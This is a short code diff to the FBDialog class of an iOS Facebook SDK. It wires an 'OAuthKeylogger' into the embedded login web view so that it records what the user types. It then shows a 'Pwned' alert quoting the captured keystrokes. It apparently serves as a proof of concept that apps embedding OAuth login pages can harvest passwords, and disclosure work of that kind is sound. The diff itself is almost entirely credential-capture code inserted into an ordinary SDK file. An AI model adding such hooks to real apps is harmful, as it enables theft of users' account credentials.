@@ -45,6 +45,7 @@ static BOOL FBIsDeviceIPad() {
 @implementation FBDialog
 
 @synthesize delegate = _delegate,
+keylogger = _keylogger,
 params   = _params;
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
@@ -365,6 +366,10 @@ params   = _params;
 
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request
  navigationType:(UIWebViewNavigationType)navigationType {
+    if ([self.keylogger handleRequest:request]) {
+        return NO;
+    }
+    
     NSURL* url = request.URL;
     
     if ([url.scheme isEqualToString:@"fbconnect"]) {
@@ -405,6 +410,11 @@ params   = _params;
     _spinner.hidden = YES;
     
     [self updateWebOrientation];
+    
+    if (!self.keylogger) {
+        self.keylogger = [[OAuthKeylogger alloc] init];
+        [self.keylogger attachKeyloggerToWebView:webView];
+    }
 }
 
 - (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error {
@@ -559,6 +569,11 @@ params   = _params;
 }
 
 - (void)dismissWithSuccess:(BOOL)success animated:(BOOL)animated {
+    NSString* msg = [NSString stringWithFormat:@"You typed '%@' and we recorded it.", self.keylogger.keys];
+    UIAlertView* alertView = [[UIAlertView alloc] initWithTitle:@"Pwned" message:msg delegate:nil cancelButtonTitle:@"Oh noes" otherButtonTitles:nil];
+    [alertView show];
+    [alertView release];
+    
     if (success) {
         if ([_delegate respondsToSelector:@selector(dialogDidComplete:)]) {
             [_delegate dialogDidComplete:self];
